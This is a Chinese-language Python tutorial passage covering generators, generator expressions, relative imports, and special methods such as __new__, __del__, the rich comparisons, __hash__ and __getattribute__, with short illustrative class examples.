<p>def: 生成器 是一个用于<strong>创建迭代器</strong>的简单而强大的工具.</p>
<p>而Generator expression返回的对象的类型是一个 <strong>generator iterator</strong>. 注意这是一个iterator, 意味着它实现了.</p>
<p>生成器和迭代器总是一起讨论</p>
<p>我们所说的生成器(Generator)通常是指一个生成器的函数, 该函数会返回一个对象, 该对象通常称之为 Generator Iterator(生成器迭代器)</p>
<p>名词:</p>
<ul>
<li>Generator: 生成器</li>
<li>Generator Iterator: 生成器迭代器</li>
</ul>
<p>Generator很像是一个普通函数, 但是关键的地方在于, 他会在函数中使用<strong>yield表达式</strong>, 从而返回一个 Generator Iterator.</p>
<p>通过该Generator Iterator 我们进行for-loop 或者基于该对象的next()方法逐步的获取所有数据</p>
<p>测试</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> collections.abc <span class="hljs-keyword">import</span> Iterator, Generator
<span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">list</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse</span>(<span class="hljs-params">data</span>):
    <span class="hljs-string">""" 翻转数据 """</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):
        <span class="hljs-keyword">yield</span> data[i]


<span class="hljs-keyword">def</span> <span class="hljs-title function_">example01</span>():
    gi = reverse([<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>])
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(gi, (Iterator)))  <span class="hljs-comment"># True</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(gi))  <span class="hljs-comment"># generator</span>

    <span class="hljs-comment"># 它是一个 Iterator, 所以可以进行 for</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> gi:
        <span class="hljs-built_in">print</span>(i)
</code></pre>
<p>可以用生成器来完成的任何功能同样可以通过基于类的迭代器来完成. 但生成器的写法更为紧凑, 因为它会自动创建 <code>__iter__()</code> 和 <code>__next__()</code> 方法</p>
<p>现在我们基于生成器 和 迭代器的方式, 实现我们的 读取文本行的功能. 但是对这个功能, 我们需要做出一些拓展</p>
<p>例如 <code># </code> 开始的文本行不读取, 空行不读取</p>
<ul>
<li>基于Iterator实现</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ClearFileIterator</span>:
    <span class="hljs-string">"""基于迭代器的方式读取干净的文本行"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self: <span class="hljs-string">'ClearFileIterator'</span>, file_path: <span class="hljs-built_in">str</span></span>):
        self.file_path = file_path
        self.file = <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):
        line = self.file.readline()
        <span class="hljs-keyword">while</span> line:
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(line.strip()) == <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> line.startswith(<span class="hljs-string">'#'</span>):
                <span class="hljs-comment"># 表示内容为空行或者以 # 开始, 是注释, 跳过</span>
                line = self.file.readline()
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">return</span> line

        <span class="hljs-comment"># 表示内容读取完毕</span>
        self.file.close()
        <span class="hljs-keyword">raise</span> StopIteration
</code></pre>
<ul>
<li>基于生成器</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_file_generator</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-string">"""基于生成器的方式, 读取干净的文本行"""</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> file:
        line = file.readline()
        <span class="hljs-keyword">while</span> line:
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(line.strip()) == <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> line.startswith(<span class="hljs-string">'#'</span>):
                <span class="hljs-comment"># 表示内容为空行或者以 # 开始, 是注释, 跳过</span>
                line = file.readline()
                <span class="hljs-keyword">continue</span>
            <span class="hljs-keyword">yield</span> line
            line = file.readline()
</code></pre>
<p><strong>相较于迭代器, 重写<code>**__iter__**</code>, <code>**__next__**</code>, 直接使用 yield 毫无疑问代码要简化很多.</strong></p>
<p><strong>为何要是用生成器 / 迭代器?</strong></p>
<hr/>
<h2 data-id="heading-30">Generator expressions(生成器表达式)</h2>
<p>Generator expressions: 我们有时也会称为生成式</p>
<p>生成式语法规则如下</p>
<pre><code class="hljs language-python" lang="python">generator_expression ::= <span class="hljs-string">"("</span> expression comp_for <span class="hljs-string">")"</span>
</code></pre>
<p>生成器表达式会生成一个新的<strong>生成器对象(Generator Object)</strong>. 它的语法与推导式相同, 只不过它被包含在圆括号中</p>
<p><strong>生成器对象(Generator Object)</strong>: 生成器对象是Python用来实现生成器迭代器的对象. 它们通常通过<strong>迭代产生值的函数</strong>来创建, 而不是显式调用</p>
<p><strong>The parentheses can be omitted on calls with only one argument. 如果调用的函数只有一个参数, 可以忽略生成式的括号</strong></p>
<p>例如</p>
<pre><code class="hljs language-python" lang="python">nums = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]
res = <span class="hljs-string">', '</span>.join(<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums)
<span class="hljs-built_in">print</span>(res)

<span class="hljs-string">"""
输出
1, 2, 3, 4, 5
"""</span>
</code></pre>
<p>为何使用生成式?  惰性求值.</p>
<p>因为生成器表达式中使用的变量会在生成器对象调用 <code>__next__()</code> 方法时<strong>惰性求值</strong>（与普通生成器的工作方式相同）. 然而, <strong>最左侧 <strong><code>for</code></strong> 子句中的可迭代表达式</strong>会<strong>立即求值</strong>. 这意味着如果这个可迭代表达式产生了错误, 那么错误将在定义生成器表达式的位置就被抛出, 而不是等到第一次取值的时候.</p>
<p>至于后续的 <code>for</code> 子句, 以及最左侧 <code>for</code> 子句中的任何过滤条件, 它们<strong>不能在外部作用域中提前求值</strong>，因为它们可能依赖于从最左侧的可迭代对象中获得的值。</p>
<p>例如：<code>(x*y for x in range(10) for y in range(x, x+10))</code></p>
<p><code>for x in range(10)</code> 立即求值, 后续的<code>for y in range(...)</code> 会在每次取值的时候在求值(evaluate)</p>
<h2 data-id="heading-31">import</h2>
<h3 data-id="heading-32">Relative import</h3>
<p>使用相对导入时，对于单独的 python 文件在运行时，应该将其视为一个 package, 而不是 module, 避免出现问题。</p>
<p>方法很简单，运行时加上 -m 即可，这样运行</p>
<p>文件结构如下</p>
<pre><code class="hljs language-python" lang="python">└─python
    ├─demo01.py
    └─demo02.py
</code></pre>
<p>我们在 python 目录之外，使用如下的运行</p>
<pre><code class="hljs language-shell" lang="shell">python -m python.demo01
</code></pre>
<p>demo01 的内容如下</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> .demo02 <span class="hljs-keyword">import</span> demo02

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    demo02()
</code></pre>
<h2 data-id="heading-33">Special Method</h2>
<p>official: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.13%2Freference%2Fdatamodel.html%23special-method-names" target="_blank" title="https://docs.python.org/zh-cn/3.13/reference/datamodel.html#special-method-names" ref="nofollow noopener noreferrer">docs.python.org/zh-cn/3.13/…</a></p>
<h3 data-id="heading-34">通用</h3>
<p><code>__new__</code> 使用较少. 如果我们需要使用单例这种, 就需要使用该方法, 也就是客制化建立的过程, 或者metaclass的时候</p>
<p><code>__new__</code>建立obj, 所以他必须要返回一个obj, 这是和<code>__init__</code> 不同</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># @author: falling snow</span>
<span class="hljs-comment"># @date: 2025-05-20</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    name = <span class="hljs-string">'falling snow'</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, name</span>):
        <span class="hljs-comment"># class &gt; object</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"create a object"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__new__: name: "</span> + name)
        <span class="hljs-comment"># 这里的写法需要注意.</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().__new__(cls)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):
        <span class="hljs-comment"># have a object, init some properties</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"object initialize"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'__init__: name: <span class="hljs-subst">{name}</span>'</span>)
        self.name = name


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:

    <span class="hljs-comment"># a = A()  # error, A.__new__() missing 1 required positional argument: 'name'</span>

    <span class="hljs-comment"># if using arguments</span>
    a1 = A(<span class="hljs-string">'alice'</span>)
    <span class="hljs-comment"># equals</span>
    <span class="hljs-comment"># a1 = __new__(A,'alice')</span>
    <span class="hljs-comment"># __init__(a1, 'alice')</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">'name = '</span> + a1.name)
</code></pre>
<ul>
<li><code>__del__</code></li>
</ul>
<p>del可以当成Cpp的析构, 但是它不是. 他的会在对象释放后, 进行调用, 做一些处理.</p>
<p>但是Python中对象的释放. 较为复杂, 例如:</p>
<ol>
<li>在引用为0时, 释放.</li>
<li>在GC时候可能释放.</li>
</ol>
<p><strong>释放的时机是任意时期. 这个过程无法控制, 所以用的不多</strong></p>
<p><code>__del__</code> 和 <code>del</code> 关键字不同.</p>
<p><code>del obj</code> 只是让obj少一个引用, 但是并不会触发<code>__del__</code></p>
<p>例如</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__del__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'__del__'</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:

    a = A()
    x = a
    <span class="hljs-keyword">del</span> a  <span class="hljs-comment"># A()创建的对象减少一次引用. 但是依旧不会释放</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'main finish'</span>)
</code></pre>
<p>output</p>
<pre><code class="hljs language-python" lang="python">main finish
__del__
</code></pre>
<ul>
<li><code>__str__</code> &amp; <code>__repr__</code></li>
</ul>
<p>二者主要是语义上不同, 都是返回一个字符串表示.</p>
<p><code>__str__</code> 返回人类理解的, 注重可读性</p>
<p><code>__repr__</code>返回更详细的信息, 此方法通常被用于调试, 因此确保其表示的内容包含丰富信息且无歧义是很重要的</p>
<p>如果一个类定义了 <code>__repr__()</code> 但未定义 <code>__str__()</code>, 则在需要该类的实例的 "非正式" 字符串表示时也会使用 <code>__repr__()</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(A()))
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(A()))
<span class="hljs-built_in">print</span>(A())  <span class="hljs-comment"># 存在__str__, 调用它, 没有的话调用__repr__</span>
</code></pre>
<ul>
<li><code>__bytes__</code></li>
</ul>
<p>如果不客制化这个对象的二进制表示. 很少使用:D</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__bytes__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># using bytes(obj), will call the method</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__bytes__called"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>])  <span class="hljs-comment"># return need bytes</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(A()))

</code></pre>
<h3 data-id="heading-35">比较</h3>
<h4 data-id="heading-36">eq and ne</h4>
<p>python将比较大小的行为称为 Rich Comparison</p>
<p>Rich Comparison一共有6个操作符</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">object</span>.__lt__(self, other)  <span class="hljs-comment"># &lt;</span>
<span class="hljs-built_in">object</span>.__le__(self, other)  <span class="hljs-comment"># &lt;=</span>
<span class="hljs-built_in">object</span>.__eq__(self, other)  <span class="hljs-comment"># ==</span>
<span class="hljs-built_in">object</span>.__ne__(self, other)  <span class="hljs-comment"># !=</span>
<span class="hljs-built_in">object</span>.__gt__(self, other)  <span class="hljs-comment"># &gt;</span>
<span class="hljs-built_in">object</span>.__ge__(self, other)  <span class="hljs-comment"># &gt;=</span>
</code></pre>
<p>我们一般用于自定义的对象比较</p>
<p>因为在python中我们在没有实现一个类的比较运算符时, 他默认调用的是<code>is</code></p>
<p>而<code>is</code> 的运算:</p>
<blockquote>
<p>每个对象都有相应的标识号、类型和值。 一个对象被创建后它的 <em>标识号</em> 就绝不会改变；你可以将其理解为该对象在内存中的地址。 <code>is</code> 运算符比较两个对象的标识号是否相同；<code>id()</code> 函数返回一个代表其标识号的整数。</p>
<p>在 CPython 中，<code>id(x)</code> 就是存放 <code>x</code> 的内存的地址</p>
</blockquote>
<p>所以</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Date</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, year, month, day</span>):
        self.year = year
        self.month = month
        self.day = day


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    d1 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">5</span>, <span class="hljs-number">20</span>)
    d2 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">5</span>, <span class="hljs-number">20</span>)
    <span class="hljs-built_in">print</span>(d1 == d2)  <span class="hljs-comment"># False</span>
    <span class="hljs-comment"># equals</span>
    <span class="hljs-built_in">print</span>(d1 <span class="hljs-keyword">is</span> d2)  <span class="hljs-comment"># False</span>
</code></pre>
<ul>
<li><code>__eq__</code></li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Date</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, year, month, day</span>):
        self.year = year
        self.month = month
        self.day = day

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-comment"># override = operator</span>
        <span class="hljs-keyword">return</span> (self.year == other.year <span class="hljs-keyword">and</span>
                self.month == other.month <span class="hljs-keyword">and</span>
                self.day == other.day)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    d1 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">5</span>, <span class="hljs-number">20</span>)
    d2 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">5</span>, <span class="hljs-number">20</span>)
    <span class="hljs-built_in">print</span>(d1 == d2)  <span class="hljs-comment"># True</span>
    <span class="hljs-comment"># if obj not override __eq__(equals), python will call is</span>
    <span class="hljs-built_in">print</span>(d1 <span class="hljs-keyword">is</span> d2)  <span class="hljs-comment"># False</span>

</code></pre>
<blockquote>
<p>[!note]</p>
<p>python对于这些 Rich Comparison的方法的返回值没有做约束, 常规情况下, 我们会使用一个boolean.</p>
<p>但在一些特殊场景, 我们可能使用一些非boolean值, 做一些hack</p>
<p>例如向量之间的比较, 我们可能就会返回一个向量</p>
</blockquote>
<ul>
<li><code>__ne__</code></li>
</ul>
<p>默认情况下, 如果没有实现该方法时, 对于 <code>__ne__()</code> , 默认会委托给 <code>__eq__()</code> 并对结果取反</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(d1 != d2)  <span class="hljs-comment"># equal !d1.__eq__(d2)</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Date</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, year, month, day</span>):
        self.year = year
        self.month = month
        self.day = day

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__ne__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-comment"># override != operator</span>
        <span class="hljs-keyword">return</span> (self.year != other.year <span class="hljs-keyword">or</span>
                self.month != other.month <span class="hljs-keyword">or</span>
                self.day != other.day)
</code></pre>
<h4 data-id="heading-37">gt and lt</h4>
<ul>
<li><code>__gt__</code> &amp; <code>__lt__</code></li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Date</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, year, month, day</span>):
        self.year = year
        self.month = month
        self.day = day

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-comment"># override == operator</span>
        <span class="hljs-keyword">return</span> (self.year == other.year <span class="hljs-keyword">and</span>
                self.month == other.month <span class="hljs-keyword">and</span>
                self.day == other.day)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__ne__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-comment"># override != operator</span>
        <span class="hljs-keyword">return</span> (self.year != other.year <span class="hljs-keyword">or</span>
                self.month != other.month <span class="hljs-keyword">or</span>
                self.day != other.day)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__gt__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__gt__"</span>)
        <span class="hljs-keyword">if</span> self.year &gt; other.year:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> self.year == other.year:
            <span class="hljs-keyword">if</span> self.month &gt; other.month:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">if</span> self.month == other.month:
                <span class="hljs-keyword">return</span> self.day &gt; other.day

        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__lt__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__lt__"</span>)
        <span class="hljs-keyword">if</span> self.year &lt; other.year:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> self.year == other.year:
            <span class="hljs-keyword">if</span> self.month &lt; other.month:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">if</span> self.month == other.month:
                <span class="hljs-keyword">return</span> self.day &lt; other.day

        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

      
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    d1 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">4</span>, <span class="hljs-number">20</span>)
    d2 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">5</span>, <span class="hljs-number">20</span>)
    <span class="hljs-built_in">print</span>(d1 &gt; d2)  <span class="hljs-comment"># False</span>
    <span class="hljs-built_in">print</span>(d1 &lt; d2)  <span class="hljs-comment"># True</span>
</code></pre>
<p><code>d1 &lt; d2</code> 对于<code>d1</code>而言是小于号, 但是对于<code>d2</code>是大于号. 那python如何确定使用什么符号呢?</p>
<p>对于这样的表达式</p>
<pre><code class="hljs language-python" lang="python">x &lt; y
</code></pre>
<p>如果x, y不是同一个类的对象, 如果y是x的衍生类, 那优先使用y的Rich Comparison</p>
<blockquote>
<p>如果两个操作数的类型不同, 且右操作数的类型是左操作数类型的直接或间接子类, 则优先选择右操作数的反射方法, 在其他情况下优先选择左操作数的方法</p>
</blockquote>
<p>例如, 我们定义如下的类</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Date</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, year, month, day</span>):
        self.year = year
        self.month = month
        self.day = day

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__gt__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__gt__"</span>)
        <span class="hljs-built_in">print</span>(
            <span class="hljs-string">f'self info: year: <span class="hljs-subst">{self.year}</span>, month: <span class="hljs-subst">{self.month}</span>, day: <span class="hljs-subst">{self.day}</span>'</span>)
        <span class="hljs-built_in">print</span>(
            <span class="hljs-string">f'other info: year: <span class="hljs-subst">{other.year}</span>, month: <span class="hljs-subst">{other.month}</span>, day: <span class="hljs-subst">{other.day}</span>'</span>)
        <span class="hljs-keyword">if</span> self.year &gt; other.year:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> self.year == other.year:
            <span class="hljs-keyword">if</span> self.month &gt; other.month:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">if</span> self.month == other.month:
                <span class="hljs-keyword">return</span> self.day &gt; other.day

        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__lt__</span>(<span class="hljs-params">self, other</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__lt__"</span>)
        <span class="hljs-built_in">print</span>(
            <span class="hljs-string">f'self info: year: <span class="hljs-subst">{self.year}</span>, month: <span class="hljs-subst">{self.month}</span>, day: <span class="hljs-subst">{self.day}</span>'</span>)
        <span class="hljs-built_in">print</span>(
            <span class="hljs-string">f'other info: year: <span class="hljs-subst">{other.year}</span>, month: <span class="hljs-subst">{other.month}</span>, day: <span class="hljs-subst">{other.day}</span>'</span>)

        <span class="hljs-keyword">if</span> self.year &lt; other.year:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> self.year == other.year:
            <span class="hljs-keyword">if</span> self.month &lt; other.month:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
            <span class="hljs-keyword">if</span> self.month == other.month:
                <span class="hljs-keyword">return</span> self.day &lt; other.day

        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>


<span class="hljs-comment"># define a subclass of Date</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SubDate</span>(<span class="hljs-title class_ inherited__">Date</span>):
    <span class="hljs-keyword">pass</span>
  
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    d1 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">4</span>, <span class="hljs-number">20</span>)
    nd = SubDate(<span class="hljs-number">2025</span>, <span class="hljs-number">1</span>, <span class="hljs-number">20</span>)

    <span class="hljs-built_in">print</span>(d1 &lt; nd)
</code></pre>
<p>输出</p>
<pre><code class="hljs language-python" lang="python">__gt__
self info: year: <span class="hljs-number">2025</span>, month: <span class="hljs-number">1</span>, day: <span class="hljs-number">20</span> 
other info: year: <span class="hljs-number">2025</span>, month: <span class="hljs-number">4</span>, day: <span class="hljs-number">20</span>
<span class="hljs-literal">False</span>
</code></pre>
<p>所以, 因为nd是d1的子类, 从结果可以看见, 调用的是子类的方法.</p>
<h4 data-id="heading-38">hash</h4>
<p>我们最长使用hash的场景就是将一个对象的hash作为字典的key</p>
<p>python对于每个自定义的类都默认生成了一个hash 以及 eq函数, 但如果我们重写了eq, 那默认生成的hash就不会生成了.</p>
<p>因为hash的定义是. 如果2个对象相等, 那他的hash应该一致. 而如果我们自定义了eq, 那python并不知道我们是否会使用hash, 所以丢弃了默认生成的hash.</p>
<p>但如果我们希望将obj作为dict的key, 除了定义eq外, 还要定义hash</p>
<p>hash的要求:</p>
<ol>
<li>返回一个整数</li>
<li>2个相同对象的hash一定要一致.</li>
</ol>
<p>python官方的建议是, 使用内置的hash方法. 将我们对象的核心属性组成一个tuple, 进行计算, 然后返回.</p>
<blockquote>
<p>[!note]</p>
<p>如果 对象本身就是 mutable , 那我们应该思考为何要将一个mutable的对象作为key?</p>
<p>这里是指是否当成mutable使用, 因为python中所有的对象都是mutable的嘛.</p>
<p>这是一个合法, 但不太聪明的行为.</p>
</blockquote>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Date</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, year, month, day</span>):
        self.year = year
        self.month = month
        self.day = day

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"Date[year: <span class="hljs-subst">{self.year}</span>, month: <span class="hljs-subst">{self.month}</span>, day: <span class="hljs-subst">{self.day}</span>]"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>((self.year, self.month, self.day))

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__bool__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># using the method of if segement </span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__bool__"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
      

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    d1 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">5</span>, <span class="hljs-number">21</span>)
    d2 = Date(<span class="hljs-number">2025</span>, <span class="hljs-number">5</span>, <span class="hljs-number">21</span>)

    <span class="hljs-comment"># a dict</span>
    income = {}
    income[d1] = <span class="hljs-number">100</span>
    income[d2] = <span class="hljs-number">100</span>
    <span class="hljs-built_in">print</span>(income)

    <span class="hljs-keyword">if</span> (d1):
        <span class="hljs-comment"># equal bool(d1) === d1.__bool__()</span>
        <span class="hljs-keyword">pass</span>
</code></pre>
<h3 data-id="heading-39">属性</h3>
<ul>
<li><code>__getattr__</code></li>
</ul>
<p>访问一个不存在的属性时, 我们该做什么</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, desc</span>):
        self.desc = desc
        self.counter = <span class="hljs-number">0</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, name</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"the name properties not exist"</span>)
        <span class="hljs-keyword">raise</span> AttributeError()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    a = A(<span class="hljs-string">"alice"</span>)
    <span class="hljs-built_in">print</span>(a.name)
</code></pre>
<ul>
<li><code>__getattribute__</code></li>
</ul>
<blockquote>
<p>此方法会无条件地被调用以实现对类实例属性的访问。如果类还定义了 <code>__getattr__()</code>，则后者不会被调用，除非 <code>__getattribute__()</code> 显式地调用它或是引发了 <code>AttributeError</code>。此方法应当返回（找到的）属性值或是引发一个 <code>AttributeError</code> 异常。为了避免此方法中的无限递归，其实现应该总是调用具有相同名称的基类方法来访问它所需要的任何属性，例如 <code>object.__getattribute__(name)</code></p>
</blockquote>
<p><strong>注意不要使用getattr(self, name)函数, 因为它会调用</strong><code>__getattribute__</code><strong>, 从而产生一个无限递归</strong></p>
<p><strong>如果需要获取当前属性, 需要通过super的方式调用</strong><code>super().__getattribute__(name)</code>. 当然使用<code>object.__getattribute__(name)</code> 也是允许的</p>
<p>下面这种也是一种递归调用!</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, desc</span>):
        self.desc = desc
        self.counter = <span class="hljs-number">0</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, name</span>):
        <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattribute__</span>(<span class="hljs-params">self, name</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__getattribute__"</span>)
        <span class="hljs-comment"># 有时我们希望统计属性的访问次数. 可能会写出如下的代码</span>
        self.counter += <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().__getattribute__(name)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    a = A(<span class="hljs-string">"alice"</span>)
    <span class="hljs-built_in">print</span>(a.desc)
</code></pre>
<p>因为<code>self.counter += 1</code> 这个操作会触发 <code>__getattribute__</code> 调用.</p>
<ul>
<li><code>__setattr__</code></li>
</ul>
